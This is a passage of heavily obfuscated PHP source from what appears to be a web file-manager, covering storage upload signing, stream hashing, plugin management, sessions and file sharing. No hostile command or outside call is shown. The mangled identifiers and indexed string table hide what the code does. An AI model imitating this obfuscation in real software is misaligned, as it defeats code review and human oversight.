ˆÛ‰Éš[275], $©©±À¢ú, $ Æóøï§); $‹í¹¦…« = array($ ˆÛ‰Éš[232] => $ ˆÛ‰Éš[12], $ ˆÛ‰Éš[277] => $ ˆÛ‰Éš[12], $ ˆÛ‰Éš[265] => $®›ÚÚ², $ ˆÛ‰Éš[270] => $Œ§ƒ‡Ë², $ ˆÛ‰Éš[278] => $©©±À¢ú, $ ˆÛ‰Éš[279] => $Ñ•×û÷Æ, $ ˆÛ‰Éš[280] => $ÇæÅª«Æ, $ ˆÛ‰Éš[281] => $œŒ‹…³Æ, $ ˆÛ‰Éš[282] => $âİŞ­Ø„, $ ˆÛ‰Éš[283] => $¬¶‡ËÉÃ, $ ˆÛ‰Éš[198] => $this->getHost()); return $‹í¹¦…«; } public function multiUploadFormData($¿¤ÔÚÄ³, $ìÎ” Š = 3600) { $æˆ€öÙ =& $_SERVER[èùÙ¹Ïö]; $Î¢§„¬ = gmdate($æˆ€öÙ[1478]); $ê­åà¦¾ = array(); $¼ËúÃª = $this->client->getUploadId($this->bucket, $¿¤ÔÚÄ³, $ê­åà¦¾); if (!$¼ËúÃª) { return !1; } return array($æˆ€öÙ[240] => $¼ËúÃª, $æˆ€öÙ[198] => $this->getHost() . $æˆ€öÙ[8] . $this->pathEncode($¿¤ÔÚÄ³), $æˆ€öÙ[241] => $Î¢§„¬, $æˆ€öÙ[96] => $¿¤ÔÚÄ³); } public function multiUploadAuthData($¥Ñ¹Ï³, $”İÅë‡µ = array()) { $¦è‰‘… =& $_SERVER[èùÙ¹Ïö]; $ØÛµò¦Ì = isset($”İÅë‡µ[$¦è‰‘…[177]]) ? $”İÅë‡µ[$¦è‰‘…[177]] : $¦è‰‘…[12]; $ö‰éÆ•ó = $”İÅë‡µ[$¦è‰‘…[96]]; unset($”İÅë‡µ[$¦è‰‘…[96]]); if (isset($”İÅë‡µ[$¦è‰‘…[242]])) { return $this->listUploadParts($ö‰éÆ•ó, $”İÅë‡µ); } $ÁÜ±×Å = array(); if (isset($”İÅë‡µ[$¦è‰‘…[1479]])) { $ÁÜ±×Å[$¦è‰‘…[1480]] = $”İÅë‡µ[$¦è‰‘…[1479]]; } $ºÃÈÁü = explode($¦è‰‘…[200], $this->getHost()); $ÆúÒÀõÆ = array($¦è‰‘…[1481] => $ºÃÈÁü[1], $¦è‰‘…[1482] => $¦è‰‘…[12], $¦è‰‘…[232] => $¦è‰‘…[122], $¦è‰‘…[277] => $”İÅë‡µ[$¦è‰‘…[78]]); $âŒı—³£ = $¦è‰‘…[245]; $ı„¢¯…Æ = $¦è‰‘…[8] . $this->pathEncode($ö‰éÆ•ó) . $ØÛµò¦Ì; $ßèŒÕà‘ = $this->client->__getSignatureV4($ÁÜ±×Å, $ÆúÒÀõÆ, $âŒı—³£, $ı„¢¯…Æ); if (strpos($ØÛµò¦Ì, $¦è‰‘…[244]) === 0) { if (isset($ÁÜ±×Å[$¦è‰‘…[1480]])) { $ˆÜÙıü¤ = $ÁÜ±×Å[$¦è‰‘…[1480]]; } else { if (isset($ßèŒÕà‘[$¦è‰‘…[1480]])) { $ˆÜÙıü¤ = $ßèŒÕà‘[$¦è‰‘…[1480]]; } else { $ˆÜÙıü¤ = hash($¦è‰‘…[275], $¦è‰‘…[12]); } } return array($¦è‰‘…[251] => $ßèŒÕà‘[$¦è‰‘…[251]], $¦è‰‘…[1480] => $ˆÜÙıü¤, $¦è‰‘…[241] => $ßèŒÕà‘[$¦è‰‘…[1483]]); } return $ßèŒÕà‘[$¦è‰‘…[251]]; } public function listUploadParts($¨ª¢·“ş, $çâÜµ˜ñ = array()) { $ùÒœ‹Ö¿ =& $_SERVER[èùÙ¹Ïö]; $ïå°ÇÄî = str_replace($ùÒœ‹Ö¿[252], $ùÒœ‹Ö¿[12], $çâÜµ˜ñ[$ùÒœ‹Ö¿[177]]); $£À¯¾²Õ = $this->client->listParts($this->bucket, $¨ª¢·“ş, $ïå°ÇÄî); if (!$£À¯¾²Õ) { return !1; } $ŸŒšôàè = $ùÒœ‹Ö¿[1484]; foreach ($£À¯¾²Õ as $¦Ø‡¦ƒÃ) { $ŸŒšôàè .= $ùÒœ‹Ö¿[1485] . "\74\120\x61\x72\164\116\165\x6d\142\145\x72\x3e{$¦Ø‡¦ƒÃ[$ùÒœ‹Ö¿[1441]]}\74\x2f\120\x61\x72\164\116\x75\x6d\142\145\162\76\12" . "\74\x45\124\x61\147\x3e{$¦Ø‡¦ƒÃ[$ùÒœ‹Ö¿[1442]]}\74\57\105\124\x61\x67\x3e\12" . $ùÒœ‹Ö¿[1486]; } $ŸŒšôàè .= $ùÒœ‹Ö¿[1487]; $êÔ¾ÇôĞ = array(); $ı‹¯äÕ½ = explode($ùÒœ‹Ö¿[200], $this->getHost()); $´‚Üƒ–ˆ = array($ùÒœ‹Ö¿[1481] => $ı‹¯äÕ½[1], $ùÒœ‹Ö¿[232] => $ùÒœ‹Ö¿[122], $ùÒœ‹Ö¿[277] => strlen($ŸŒšôàè)); $½©·Óš® = $ùÒœ‹Ö¿[243]; $ÁÔêŒó = $ùÒœ‹Ö¿[8] . $this->pathEncode($¨ª¢·“ş) . $çâÜµ˜ñ[$ùÒœ‹Ö¿[177]]; $°‡ñÅ• = $this->client->__getSignatureV4($êÔ¾ÇôĞ, $´‚Üƒ–ˆ, $½©·Óš®, $ÁÔêŒó, $ŸŒšôàè); return array($ùÒœ‹Ö¿[251] => $°‡ñÅ•[$ùÒœ‹Ö¿[251]], $ùÒœ‹Ö¿[241] => $°‡ñÅ•[$ùÒœ‹Ö¿[1483]], $ùÒœ‹Ö¿[253] => $£À¯¾²Õ, $ùÒœ‹Ö¿[1480] => $°‡ñÅ•[$ùÒœ‹Ö¿[1480]]); } public function link($Ÿ°¶š©‚, $«÷ëâ•„ = array()) { return parent::link($Ÿ°¶š©‚, $«÷ëâ•„); } public function fileOut($âÏ½äîŞ, $ºƒÓËùæ = false, $Äº¹Ç™ = false, $©¹£Èª” = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[èùÙ¹Ïö][1488])) { return parent::fileOutServer($âÏ½äîŞ, $ºƒÓËùæ, $Äº¹Ç™, $©¹£Èª”); } parent::fileOut($âÏ½äîŞ, $ºƒÓËùæ, $Äº¹Ç™, $©¹£Èª”); } public function fileOutImage($Œ¿ğÇ¸Ø, $Å’ÙüèÁ = 250) { if (strstr($this->endpoint, $_SERVER[èùÙ¹Ïö][1488])) { return parent::fileOutImageServer($Œ¿ğÇ¸Ø, $Å’ÙüèÁ); } parent::fileOutImage($Œ¿ğÇ¸Ø, $Å’ÙüèÁ); } public function fileOutLink($ÇÏ‚§Ì¹) { $…ÓèÁ•ó =& $_SERVER[èùÙ¹Ïö]; if (substr($ÇÏ‚§Ì¹, 0, 7) == $…ÓèÁ•ó[1379]) { $ÇÏ‚§Ì¹ = $…ÓèÁ•ó[1380] . substr($ÇÏ‚§Ì¹, 7); } header($…ÓèÁ•ó[164] . $ÇÏ‚§Ì¹); die; } public function getHost() { $±«­Ãôƒ =& $_SERVER[èùÙ¹Ïö]; $Ë¡Š£÷à = str_rtrim(parent::getHost(), $±«­Ãôƒ[8] . $this->bucket); $Ë¡Š£÷à = explode($±«­Ãôƒ[200], $Ë¡Š£÷à); return $Ë¡Š£÷à[0] . $±«­Ãôƒ[200] . $this->bucket . $±«­Ãôƒ[10] . $Ë¡Š£÷à[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($•¤Ó Œ­, $î×µæ…Ò = 0) { parent::__construct(); $this->source = $•¤Ó Œ­; $this->sourceSize = $î×µæ…Ò; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($ÑûãÍ  = false) { return $this->sourceSize; } public function getContent($ŸŠÁšìö = false) { return $this->fileSubstr($ŸŠÁšìö, 0, $this->sourceSize); } public function fileSubstr($øÔÀªÃ® = false, $Ä¢Ü²ê¶ = 0, $ĞòÖåĞÒ = 0) { if (!$ĞòÖåĞÒ) { $ĞòÖåĞÒ = $this->sourceSize; } $£Ş«Ğ¡ = $this->sourceSize - $Ä¢Ü²ê¶; if ($ĞòÖåĞÒ >= $£Ş«Ğ¡) { $ĞòÖåĞÒ = $£Ş«Ğ¡; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $Ä¢Ü²ê¶, $ĞòÖåĞÒ); } if ($this->sourceType == self::TYPE_FILE) { if ($ĞòÖåĞÒ <= 0) { return $_SERVER[èùÙ¹Ïö][12]; } $•û£ıë = ftell($this->source); fseek_64($this->source, $•û£ıë + $Ä¢Ü²ê¶); $ª´ÙŒ¡ = @fread($this->source, $ĞòÖåĞÒ); fseek_64($this->source, $•û£ıë); return $ª´ÙŒ¡; } } public function hashMd5($Ó÷Àšõ = false) { return md5($this->getContent()); } public static function hash($Ö²ş€´ˆ, $Öø¨­í¤ = 0) { $Ô¤¥£’ = new PathDriverStream($Ö²ş€´ˆ, $Öø¨­í¤); return $Ô¤¥£’->hashSimple($Ö²ş€´ˆ); } public static function md5($¡ù§³˜Û, $Ùµ½÷ì‚ = 0) { $ÛÇïàõŞ = new PathDriverStream($¡ù§³˜Û, $Ùµ½÷ì‚); return $ÛÇïàõŞ->hashMd5($¡ù§³˜Û); } } goto dµ“à³¿İ; eË†­Ö¢ğ: class PluginModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\x65\155\x2e\x70\154\x75\x67\151\156\114\151\x73\x74"; public $field = array("\x6e\x61\155\x65", "\163\164\x61\164\165\163", "\x72\145\x67\151\x65\163\164", "\143\x6f\x6e\x66\151\x67"); public function loadList($Œ¾…¦³® = false) { $ü®¬õê = array_to_keyvalue($this->listData(), $_SERVER[èùÙ¹Ïö][32]); if ($Œ¾…¦³®) { return $ü®¬õê[$Œ¾…¦³®]; } return $ü®¬õê; } public function init() { $©õ°õ¹Ò =& $_SERVER[èùÙ¹Ïö]; Hook::trigger($©õ°õ¹Ò[2014]); $„œâé‰Æ = $this->loadPluginList(); foreach ($„œâé‰Æ as $“ææş‹à => $ã—”äÉñ) { $¯‰ˆàÆÉ = $this->appAllow($“ææş‹à, $ã—”äÉñ); if (!$¯‰ˆàÆÉ) { continue; } foreach ($ã—”äÉñ[$©õ°õ¹Ò[2015]] as $¹÷Ò›ÍÛ => $Îşé ‘ª) { Hook::bind($¹÷Ò›ÍÛ, $Îşé ‘ª); } } Hook::trigger($©õ°õ¹Ò[2016]); Hook::trigger(ACTION); } public function appAllow($ŞŒ×… Ô, $Á·ü“ïË, $È²¿‹‹ = true) { $ÒüøµÒë =& $_SERVER[èùÙ¹Ïö]; $èÚ‡¡ì = PLUGIN_DIR . $ŞŒ×… Ô . $ÒüøµÒë[2017]; if (!is_array($Á·ü“ïË) || !is_array($Á·ü“ïË[$ÒüøµÒë[2015]]) || $Á·ü“ïË[$ÒüøµÒë[790]] != 1 || !is_file($èÚ‡¡ì)) { return !1; } if ($GLOBALS[$ÒüøµÒë[539]] == 1) { if ($GLOBALS[$ÒüøµÒë[6]][$ÒüøµÒë[2018]] || !$GLOBALS[$ÒüøµÒë[6]][$ÒüøµÒë[2019]]) { return !0; } $ô×·‹ Ó = explode($ÒüøµÒë[50], strtolower($GLOBALS[$ÒüøµÒë[6]][$ÒüøµÒë[2019]])); return in_array(strtolower($ŞŒ×… Ô), $ô×·‹ Ó) ? !1 : !0; } if ($È²¿‹‹ && !Action($ÒüøµÒë[2020])->checkAuth($ŞŒ×… Ô)) { return !1; } return !0; } public function unInstall($×„Ÿ”‘Ì) { $§¯ÎÎ™Ç =& $_SERVER[èùÙ¹Ïö]; $àÀÍûç… = $this->loadList($×„Ÿ”‘Ì); if (file_exists(PLUGIN_DIR . $×„Ÿ”‘Ì)) { Hook::apply($×„Ÿ”‘Ì . $§¯ÎÎ™Ç[2021]); } $this->remove($àÀÍûç…[$§¯ÎÎ™Ç[445]]); } public function changeStatus($Åñ·ŒşŞ, $×¬ù÷ÛÆ) { $³°ï¿¬ˆ =& $_SERVER[èùÙ¹Ïö]; $‰¿•¸ôÆ = $this->loadList($Åñ·ŒşŞ); if ($×¬ù÷ÛÆ) { Hook::apply($Åñ·ŒşŞ . $³°ï¿¬ˆ[2022]); } $this->update($‰¿•¸ôÆ[$³°ï¿¬ˆ[445]], array($³°ï¿¬ˆ[2023] => $×¬ù÷ÛÆ)); } public function appRegist($‚¸Ö§„Ü, $ÛïøüŸ) { $ÒÎ÷ó‹½ =& $_SERVER[èùÙ¹Ïö]; $äúŸıšÙ = $this->loadList($‚¸Ö§„Ü); if ($äúŸıšÙ) { $this->update($äúŸıšÙ[$ÒÎ÷ó‹½[445]], array($ÒÎ÷ó‹½[2015] => $ÛïøüŸ)); } else { $¾ƒ‹ç¨é = array($ÒÎ÷ó‹½[32] => $‚¸Ö§„Ü, $ÒÎ÷ó‹½[2015] => $ÛïøüŸ, $ÒÎ÷ó‹½[790] => 0, $ÒÎ÷ó‹½[6] => $this->getConfigDefault($‚¸Ö§„Ü)); $this->insert($¾ƒ‹ç¨é); } } public function getConfigDefault($“•€¯¤) { $‡Û‚«ƒø =& $_SERVER[èùÙ¹Ïö]; $É¸åùÚ‹ = array(); $”¯ıª = $this->getPackageJson($“•€¯¤); if (!$”¯ıª && is_array($”¯ıª[$‡Û‚«ƒø[2024]])) { return $É¸åùÚ‹; } foreach ($”¯ıª[$‡Û‚«ƒø[2024]] as $’€ÉŒ¹å => $¢Î“–Ö‡) { if (!isset($¢Î“–Ö‡[$‡Û‚«ƒø[420]]) || isset($É¸åùÚ‹[$’€ÉŒ¹å])) { continue; } $É¸åùÚ‹[$’€ÉŒ¹å] = $¢Î“–Ö‡[$‡Û‚«ƒø[420]]; } return $É¸åùÚ‹; } public function getPackageJson($áÉÀİŸ½) { return Hook::apply($áÉÀİŸ½ . $_SERVER[èùÙ¹Ïö][2025]); } public function getConfig($í•­‹ÎÑ, $å¡©ß “ = false) { $óå²‡®î =& $_SERVER[èùÙ¹Ïö]; $›Õ˜²‡Œ = array(); $” Â§İ· = $this->loadList($í•­‹ÎÑ); if ($” Â§İ· && is_array($” Â§İ·[$óå²‡®î[6]])) { $›Õ˜²‡Œ = $” Â§İ·[$óå²‡®î[6]]; } if (!$›Õ˜²‡Œ || $å¡©ß “) { $›Õ˜²‡Œ = $this->getConfigDefault($í•­‹ÎÑ); } return $›Õ˜²‡Œ; } public function setConfig($ôçÓ±, $ŒÀÁçã = false) { $—Âö¨„” =& $_SERVER[èùÙ¹Ïö]; $¤™Ë‘ = $this->loadList($ôçÓ±); if (!$¤™Ë‘) { return !1; } $ˆ¤’ûÒÑ = $¤™Ë‘[$—Âö¨„”[6]]; if ($ŒÀÁçã == !1) { $ˆ¤’ûÒÑ = array(); $ŒÀÁçã = $this->getConfigDefault($ôçÓ±); } foreach ($ŒÀÁçã as $§™Ğ¾äƒ => $â¡Ÿ×€Ø) { $ˆ¤’ûÒÑ[$§™Ğ¾äƒ] = is_string($â¡Ÿ×€Ø) ? trim($â¡Ÿ×€Ø) : $â¡Ÿ×€Ø; } $this->update($¤™Ë‘[$—Âö¨„”[445]], array($—Âö¨„”[6] => $ˆ¤’ûÒÑ)); } public function viewList() { $Ñ¶ñ¸æã =& $_SERVER[èùÙ¹Ïö]; $¾áê¥¦¹ = $this->loadList(); $this->pluginScan($¾áê¥¦¹); $¾áê¥¦¹ = $this->loadPluginList(); $‰¾’‹²ô = array(); foreach ($¾áê¥¦¹ as $ÜÊ”Ãô => $•–ãéÖÎ) { $îºæœ = $•–ãéÖÎ; unset($•–ãéÖÎ[$Ñ¶ñ¸æã[2015]], $•–ãéÖÎ[$Ñ¶ñ¸æã[6]]); $Îİ©æåÂ = PLUGIN_DIR . $•–ãéÖÎ[$Ñ¶ñ¸æã[32]] . $Ñ¶ñ¸æã[2017]; if (!is_file($Îİ©æåÂ)) { continue; } $Æ¼¨ÁÒî = Hook::apply($•–ãéÖÎ[$Ñ¶ñ¸æã[32]] . $Ñ¶ñ¸æã[2025]); if (!is_array($Æ¼¨ÁÒî)) { continue; } $‰¾’‹²ô[$ÜÊ”Ãô] = array_merge($•–ãéÖÎ, $Æ¼¨ÁÒî); if ($îºæœ[$Ñ¶ñ¸æã[6]][$Ñ¶ñ¸æã[2026]] != $Æ¼¨ÁÒî[$Ñ¶ñ¸æã[1591]]) { Hook::apply($•–ãéÖÎ[$Ñ¶ñ¸æã[32]] . $Ñ¶ñ¸æã[2022]); $îºæœ[$Ñ¶ñ¸æã[6]][$Ñ¶ñ¸æã[2026]] = $Æ¼¨ÁÒî[$Ñ¶ñ¸æã[1591]]; $this->update($•–ãéÖÎ[$Ñ¶ñ¸æã[445]], array($Ñ¶ñ¸æã[6] => $îºæœ[$Ñ¶ñ¸æã[6]])); } } return $‰¾’‹²ô; } private function loadPluginList() { $®ıöÆ¼Ä =& $_SERVER[èùÙ¹Ïö]; $¯ï±ÊÅ÷ = $this->loadList(); if (strtolower(MOD) == $®ıöÆ¼Ä[2027]) { return $¯ï±ÊÅ÷; } $µñ°¼Š = Hook::trigger($®ıöÆ¼Ä[2028], $¯ï±ÊÅ÷); if ($¯ï±ÊÅ÷ && !$µñ°¼Š) { die; } return $µñ°¼Š ? $µñ°¼Š : $¯ï±ÊÅ÷; } private function pluginScan($Ğ—á‘‘Ï) { $·Û˜Ïœö =& $_SERVER[èùÙ¹Ïö]; recursion_dir(PLUGIN_DIR, $ûšÓ¿û¸, $±ß–¶ã‡, 0); foreach ($ûšÓ¿û¸ as $ÁøÃĞ–…) { $ÑÈ¾„¨ = get_path_this($ÁøÃĞ–…); if (isset($Ğ—á‘‘Ï[$ÑÈ¾„¨]) || !file_exists($ÁøÃĞ–… . $·Û˜Ïœö[2029]) || !file_exists($ÁøÃĞ–… . $·Û˜Ïœö[2017])) { continue; } Hook::apply($ÑÈ¾„¨ . $·Û˜Ïœö[2022]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\171\x73\164\x65\155\x5f\x73\145\163\163\x69\157\156"; public function get($ê®ˆ¡†í) { $áåÏ¶©É =& $_SERVER[èùÙ¹Ïö]; $ã‚öº½ = $this->where(array($áåÏ¶©É[2030] => $ê®ˆ¡†í))->find(); if (!is_array($ã‚öº½)) { return !1; } return $ã‚öº½[$áåÏ¶©É[794]]; } public function set($Ùãæ¼ñµ, $ŒÊºØ×ø, $ÔÕ÷•ğ½ = 3600) { $´¬·¼’ =& $_SERVER[èùÙ¹Ïö]; $‡üœı  = array($´¬·¼’[2030] => $Ùãæ¼ñµ, $´¬·¼’[1933] => $ŒÊºØ×ø, $´¬·¼’[2031] => $ÔÕ÷•ğ½ + time()); if (Session::get($´¬·¼’[2032])) { $‡üœı [$´¬·¼’[1696]] = Session::get($´¬·¼’[2032]); } else { $‡üœı [$´¬·¼’[1696]] = 0; } if ($this->get($Ùãæ¼ñµ)) { return $this->where(array($´¬·¼’[2030] => $Ùãæ¼ñµ))->save($‡üœı ); } else { return $this->add($‡üœı , array(), !0); } } public function remove($Ğ¤ó•õ) { return $this->where(array($_SERVER[èùÙ¹Ïö][2030] => $Ğ¤ó•õ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[èùÙ¹Ïö][2033] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\150\x61\x72\145"; protected $dataAuto = array(array("\155\x6f\144\151\146\171\x54\x69\155\x65", "\x74\x69\155\x65", "\x69\x6e\163\145\162\x74\54\x75\x70\x64\141\164\x65", "\146\165\x6e\143\164\151\157\x6e"), array("\x63\162\x65\141\164\145\124\151\155\145", "\164\151\x6d\145", "\151\156\x73\x65\x72\164", "\x66\165\156\x63\164\x69\x6f\x6e"), array("\157\160\x74\x69\157\156\x73", '', "\151\156\163\145\x72\164\x2c\x75\x70\x64\141\x74\x65\x2c\163\x65\154\x65\143\164", "\x6a\163\x6f\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($·Ã÷Ûç) { $‰Ï•©Ãµ =& $_SERVER[èùÙ¹Ïö]; $¤±‰Ö€ = isset($·Ã÷Ûç[0]) ? $·Ã÷Ûç[0] : !1; return array($‰Ï•©Ãµ[2034] => array(USER_ID, $‰Ï•©Ãµ[2035]), $‰Ï•©Ãµ[1974] => array($¤±‰Ö€, $‰Ï•©Ãµ[2036])); } protected function listSimple() { $ÌĞª’âª = array($_SERVER[èùÙ¹Ïö][1696] => USER_ID); $®–ä¾’ = $this->field($this->fieldList)->where($ÌĞª’âª)->select(); return $®–ä¾’ ? $®–ä¾’ : array(); } protected function getInfo($’äÇëóğ, $õ’”™İ = false) { $›¨÷‰§Ş =& $_SERVER[èùÙ¹Ïö]; if ($õ’”™İ) { return $this->_getShareInfo(array($›¨÷‰§Ş[636] => $’äÇëóğ)); } $îîÓ õş = $this->cacheFunctionGet($›¨÷‰§Ş[1976], $’äÇëóğ); return $îîÓ õş; } public function getInfoByHash($úÖÓœˆÔ) { return $this->_getShareInfo(array($_SERVER[èùÙ¹Ïö][2037] => $úÖÓœˆÔ)); } public function getInfoByPath($ÍËù´€È) { $–ø¬¢›° =& $_SERVER[èùÙ¹Ïö]; $¦¾şÖ» = array($–ø¬¢›°[1696] => USER_ID, $–ø¬¢›°[183] => $ÍËù´€È); return $this->_getShareInfo($¦¾şÖ»); } public function getInfoBySourcePath($£ÇÚÒşõ) { $ÖÛí¤œ“ =& $_SERVER[èùÙ¹Ïö]; $¾™Â™Äò = array($ÖÛí¤œ“[1696] => USER_ID, $ÖÛí¤œ“[1223] => $£ÇÚÒşõ); return $this->_getShareInfo($¾™Â™Äò); } private function _getShareInfo($ŒøÏ›©) { $ ¶±Óå =& $_SERVER[èùÙ¹Ïö]; $Çßé´ğ÷ = $this->where($ŒøÏ›©)->find(); if (!$Çßé´ğ÷) { return !1; } $ŒøÏ›© = array($ ¶±Óå[636] => $Çßé´ğ÷[$ ¶±Óå[636]]); $¾ƒ™¼õÌ = $ ¶±Óå[2038]; $ƒ±°˜ÑÏ = Model($ ¶±Óå[637])->order($ ¶±Óå[445])->field($¾ƒ™¼õÌ)->where($ŒøÏ›©)->select(); if ($Çßé´ğ÷[$ ¶±Óå[183]] == $ ¶±Óå[214]) { $Çßé´ğ÷[$ ¶±Óå[89]] = IO::info($Çßé´ğ÷[$ ¶±Óå[1223]]); } else { $Çßé´ğ÷[$ ¶±Óå[89]] = Model($ ¶±Óå[1381])->pathInfo($Çßé´ğ÷[$ ¶±Óå[183]]); } $Çßé´ğ÷[$ ¶±Óå[2039]] = $ƒ±°˜ÑÏ; return $Çßé´ğ÷; } protected function getInfoAuth($ÑâÒˆ¬Ü) { $ù¯ ¯æ =& $_SERVER[èùÙ¹Ïö]; $ÛÕšãó = $this->getInfo($ÑâÒˆ¬Ü); if ($ÛÕšãó[$ù¯ ¯æ[1696]] == USER_ID) { $ÛÕšãó[$ù¯ ¯æ[457]] = $ÛÕšãó[$ù¯ ¯æ[89]][$ù¯ ¯æ[457]]; } else { $ÛÕšãó[$ù¯ ¯æ[457]] = Model($ù¯ ¯æ[538])->authMake($ÛÕšãó[$ù¯ ¯æ[2039]]); } return $ÛÕšãó; } protected function listData($º‡ˆšÙˆ = null, $Ó·‰íÜ = 300) { $ôÏ“ëõ =& $_SERVER[èùÙ¹Ïö]; $ºáĞ»‰ˆ = array(array($ôÏ“ëõ[533] => array($ôÏ“ëõ[1058], 0), $ôÏ“ëõ[634] => array($ôÏ“ëõ[1058], 0), $ôÏ“ëõ[2040] => $ôÏ“ëõ[1992])); if ($º‡ˆšÙˆ == $ôÏ“ëõ[2041]) { $ºáĞ»‰ˆ = array($ôÏ“ëõ[533] => 1); } else { if ($º‡ˆšÙˆ == $ôÏ“ëõ[1209]) { $ºáĞ»‰ˆ = array($ôÏ“ëõ[634] => 1); } } $ºáĞ»‰ˆ[$ôÏ“ëõ[1696]] = USER_ID; $Ñòœ‚Š = $this->where($ºáĞ»‰ˆ)->selectPage($Ó·‰íÜ); return $Ñòœ‚Š; } protected function listToMe($Š­ğ–«® = 300) { $ÂŞš†á =& $_SERVER[èùÙ¹Ïö]; $ãÊÌÒ×¥ = Model($ÂŞš†á[2042])->userGroupParents(USER_ID); $±€»î²ù = array($ÂŞš†á[619] => SourceModel::TYPE_USER, $ÂŞš†á[541] => USER_ID); if ($ãÊÌÒ×¥) { $±€»î²ù = array(array($ÂŞš†á[619] => SourceModel::TYPE_USER, $ÂŞš†á[541] => USER_ID), array($ÂŞš†á[619] => SourceModel::TYPE_GROUP, $ÂŞš†á[541] => array($ÂŞš†á[7], $ãÊÌÒ×¥)), $ÂŞš†á[2040] => $ÂŞš†á[1992]); } $Øò‰Á£ô = Model($ÂŞš†á[637])->where($±€»î²ù)->selectPage($Š­ğ–«®); $İæ“„È = array_to_keyvalue_group($Øò‰Á£ô[$ÂŞš†á[415]], $ÂŞš†á[636]); if (!$İæ“„È) { return $Øò‰Á£ô; } $ı‹ îÙà = $ÂŞš†á[2043]; $±€»î²ù = array($ÂŞš†á[636] => array($ÂŞš†á[462], array_keys($İæ“„È)), $ÂŞš†á[1696] => array($ÂŞš†á[1060], $ÂŞš†á[214])); $¬–¸ = $this->field($ı‹ îÙà)->where($±€»î²ù)->select(); foreach ($¬–¸ as $¥İ©¤Êç => &$±ÉÈß›†) { $±ÉÈß›†[$ÂŞš†á[2039]] = $İæ“„È[$±ÉÈß›†[$ÂŞš†á[636]]]; } unset($±ÉÈß›†); $€ÑÏ¸É = array($ÂŞš†á[2044] => $¬–¸, $ÂŞš†á[2045] => $Øò‰Á£ô[$ÂŞš†á[412]]); return $€ÑÏ¸É; } protected function shareAdd($‹âÀÂ£ï, $ĞÌ‡Ë») { $°…¿º„‡ =& $_SERVER[èùÙ¹Ïö]; $Ç°ÎÖêØ = $this->_addShareData($‹âÀÂ£ï, $ĞÌ‡Ë»); if (!empty($ĞÌ‡Ë»[$°…¿º„‡[2046]])) { $this->_shareAuthSet($Ç°ÎÖêØ, $ĞÌ‡Ë»[$°…¿º„‡[2046]]); } $this->shareEventAdd($‹âÀÂ£ï, $ĞÌ‡Ë», $°…¿º„‡[2047]); return $Ç°ÎÖêØ; } protected function shareAddSystem($º”Èç, $îŸÂÀ¹˜) { $Šœ«¢‡ =& $_SERVER[èùÙ¹Ïö]; $ªÀé§·ª = $this->_addShareData($º”Èç, $îŸÂÀ¹˜, $Šœ«¢‡[181]); $this->_shareAuthSet($ªÀé§·ª, $îŸÂÀ¹˜[$Šœ«¢‡[2046]]); return $ªÀé§·ª; } private function shareEventAdd($Óï½å”Ø, $«®€³¤, $ıÑ’Â…Ÿ = "\141\x64\x64") { $­¼¬ıè† =& $_SERVER[èùÙ¹Ïö]; if (!$Óï½å”Ø || $Óï½å”Ø == $­¼¬ıè†[214]) { return; } if ($ıÑ’Â…Ÿ == $­¼¬ıè†[2047]) { if ($«®€³¤[$­¼¬ıè†[533]] == $­¼¬ıè†[90]) { Model($­¼¬ıè†[604])->eventShare($Óï½å”Ø, $­¼¬ıè†[2048]); } if ($«®€³¤[$­¼¬ıè†[634]] == $­¼¬ıè†[90]) { Model($­¼¬ıè†[604])->eventShare($Óï½å”Ø, $­¼¬ıè†[2049]); } return; } $ª‚ôô†“ = $this->getInfoByPath($Óï½å”Ø); $‚Á‘š´é = $­¼¬ıè†[2050]; if ($ª‚ôô†“[$­¼¬ıè†[533]] == $­¼¬ıè†[214] && $«®€³¤[$­¼¬ıè†[533]] == $­¼¬ıè†[90]) { $‚Á‘š´é = $­¼¬ıè†[2048]; } if ($ª‚ôô†“[$­¼¬ıè†[533]] == $­¼¬ıè†[90] && $«®€³¤[$­¼¬ıè†[533]] == $­¼¬ıè†[214]) { $‚Á‘š´é = $­¼¬ıè†[2051]; } if ($ª‚ôô†“[$­¼¬ıè†[634]] == $­¼¬ıè†[214] && $«®€³¤[$­¼¬ıè†[634]] == $­¼¬ıè†[90]) { $‚Á‘š´é = $­¼¬ıè†[2049]; } if ($ª‚ôô†“[$­¼¬ıè†[634]] == $­¼¬ıè†[90] && $«®€³¤[$­¼¬ıè†[634]] == $­¼¬ıè†[214]) { $‚Á‘š´é = $­¼¬ıè†[2052]; } Model($­¼¬ıè†[604])->eventShare($Óï½å”Ø, $‚Á‘š´é); return; } private function _addShareData($¢®Çı©õ, $×†â·¥ = array(), $šªË×ÚÏ = false) { $¥ÔƒŒø =& $_SERVER[èùÙ¹Ïö]; $ÊÎ ¦­ú = $šªË×ÚÏ == $¥ÔƒŒø[181] ? 0 : USER_ID; $ØØ÷—Ñ = array($¥ÔƒŒø[461] => $¢®Çı©õ, $¥ÔƒŒø[1687] => $ÊÎ ¦­ú); if ($¢®Çı©õ == 0) { $ØØ÷—Ñ = array($¥ÔƒŒø[2053] => $×†â·¥[$¥ÔƒŒø[1223]], $¥ÔƒŒø[1687] => $ÊÎ ¦­ú); } if ($ÒÃ˜ïæ¡ = $this->where($ØØ÷—Ñ)->find()) { return $ÒÃ˜ïæ¡[$¥ÔƒŒø[636]]; } if ($¢®Çı©õ == 0) { $à´ÇÑÖ× = array($¥ÔƒŒø[32] => get_path_this($×†â·¥[$¥ÔƒŒø[86]])); } else { $à´ÇÑÖ× = Model($¥ÔƒŒø[865])->sourceInfo($¢®Çı©õ); if (!$à´ÇÑÖ×) { return !1; } } if (!$×†â·¥[$¥ÔƒŒø[1592]]) { $×†â·¥[$¥ÔƒŒø[1592]] = $à´ÇÑÖ×[$¥ÔƒŒø[32]]; } $‚ó†Î»¸ = array($¥ÔƒŒø[1687] => $ÊÎ ¦­ú, $¥ÔƒŒø[461] => $¢®Çı©õ, $¥ÔƒŒø[1592] => $¥ÔƒŒø[12], $¥ÔƒŒø[533] => 0, 